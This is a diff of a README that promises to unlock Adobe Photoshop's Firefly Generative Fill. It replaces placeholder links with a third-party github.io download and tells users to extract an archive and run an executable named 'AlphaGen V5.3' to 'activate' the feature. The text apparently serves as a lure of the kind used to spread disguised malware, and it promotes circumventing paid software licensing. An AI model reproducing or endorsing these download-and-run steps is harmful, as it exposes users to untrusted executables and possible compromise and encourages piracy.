@@ -2,13 +2,15 @@
 
 Unlock Generative Fill in Adobe Photoshop with Firefly AI. Generate, expand, or replace image areas using text prompts and content-aware intelligence.
 
-[![Download](https://img.shields.io/badge/Download-Generative_Fill-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Generative_Fill-blueviolet)](https://generative-fill-adobe-firefly.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://generative-fill-adobe-firefly.github.io/.github
+)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch Adobe Photoshop CC and access Generative Fill with full functionality
